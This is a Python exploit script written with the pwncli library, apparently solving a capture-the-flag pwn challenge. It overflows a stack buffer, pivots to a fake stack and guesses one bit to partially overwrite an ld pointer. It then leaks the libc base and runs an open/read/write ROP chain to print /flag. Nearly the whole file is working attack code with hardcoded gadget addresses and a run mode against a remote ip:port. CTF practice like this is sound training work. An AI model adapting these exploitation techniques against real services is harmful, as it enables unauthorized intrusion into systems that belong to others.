#!/usr/bin/env python3
# Date: 2023-11-04 09:49:11
# Link: https://github.com/RoderickChan/pwncli
# Usage:
#     Debug : python3 exp.py debug elf-file-path -t -b malloc
#     Remote: python3 exp.py remote elf-file-path ip:port

from lianpwn import *
from pwncli import *

cli_script()
set_remote_libc("./libc-2.27.so")

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

brop_gadget = 0x40095A
pop_rsi_r15_ret = brop_gadget + 7
pop_rdi_ret = brop_gadget + 9
ret_addr = brop_gadget + 10
leave_ret = 0x0000000000400876

read_addr = elf.plt.read

fake_stack = 0x601000

payload = b"a" * (64) + p64(fake_stack + 0x100)

payload += flat(
    [
        pop_rsi_r15_ret,
        fake_stack + 0x100,
        0,
        read_addr,
        pop_rsi_r15_ret,
        fake_stack + 0x80,
        0,
        read_addr,
        pop_rsi_r15_ret,
        elf.sym.stdout,
        0,
        pop_rdi_ret,
        1,
    ]
)
payload += p64(ret_addr) * (0x10 - 9 - 4)

# magic_gadget: syscall; lea rsp, [rbp - 0x28]; pop rbx; pop r12; pop r13; pop r14; pop r15; pop rbp; ret
guessBIT0 = int(input("[INPUT] Guess one bit for ld: "), 16)
payload += p16(0x1116 + (guessBIT0 << 12))
s(payload)

payload = flat(
    [
        0,
        pop_rsi_r15_ret,
        0x601138 - 8,
        0,
        pop_rdi_ret,
        0,
        read_addr,
    ]
)
input()
s(payload)

input()
s(b"a")

libc_base = u64_ex(rn(6)) - 0x3EC760
lg("libc_base", libc_base)
assert libc_base & 0xFFF == 0
print(hex(libc_base))
pop_rsi_ret = 0x0000000000023A6A + libc_base
pop_rdx_ret = 0x0000000000130516 + libc_base

payload = b"/flag\x00".ljust(8, b"\x00")
payload += flat(
    [
        pop_rsi_ret,
        0,
        pop_rdi_ret,
        0x601130,
        libc_base + libc.sym.open,
        pop_rdi_ret,
        3,
        pop_rsi_ret,
        0x601048,
        pop_rdx_ret,
        0x100,
        libc_base + libc.sym.read,
        pop_rdi_ret,
        1,
        libc_base + libc.sym.write,
    ]
)
input()
s(payload)


ia()
